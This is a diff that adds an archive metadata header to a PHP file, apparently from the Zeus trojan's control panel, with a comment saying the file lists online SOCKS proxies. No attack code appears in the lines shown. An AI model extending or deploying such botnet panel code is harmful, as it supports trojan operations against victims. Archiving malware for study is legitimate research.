@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 <?php
 /*  Getting a list of socks that are online.
   File should be laid to the root of the control panel.*/
